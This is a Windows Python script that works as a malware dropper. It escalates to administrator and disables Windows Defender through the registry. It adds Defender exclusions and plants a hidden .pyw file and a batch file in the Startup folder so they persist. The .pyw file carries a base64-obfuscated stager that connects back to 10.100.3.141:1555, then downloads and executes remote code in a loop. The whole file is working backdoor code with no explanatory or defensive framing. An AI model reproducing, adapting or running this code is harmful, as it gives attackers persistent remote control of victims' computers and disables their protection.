import os
import ctypes, sys
import subprocess
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
        F = """

import os
import urllib.request, string, random, struct, time, ssl, ctypes as LWaDKVvcgwiajEA
import ctypes
import sys

os.system('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f')
    #CODE HERE (with one identation)
def toRun():
    #CODE HERE
    exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEwLjEwMC4zLjE0MScsMTU1NSkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoZCkpLHsncyc6c30pCg==')[0]))      
    #END MS CODE

while True:
    toRun()
    time.sleep(3)
"""
        os.system('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f')
        l = open("temp.pyw","w")
        l.write(F)
        l.close()
        username = os.getlogin()
        J = """
python temp.pyw
"""
        h = open("iasditu1239fakjs.bat","w")
        h.write(J)
        h.close()
        os.system(fr'COPY "iasditu1239fakjs.bat" "C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"')
        os.system(fr'COPY "temp.pyw" "C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"')
        subprocess.call(['runas', '/user:Administrator', fr'powershell -Command Add-MpPreference -ExclusionPath "C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"'])
        subprocess.call(['runas', '/user:Administrator', 'powershell -Command Add-MpPreference -ExclusionProcess "temp.pyw"'])
        subprocess.call(['runas', '/user:Administrator', fr'powershell -Command Add-MpPreference -ExclusionPath "C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\temp.pyw"'])
        
        os.system('python temp.pyw')

else:
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

         
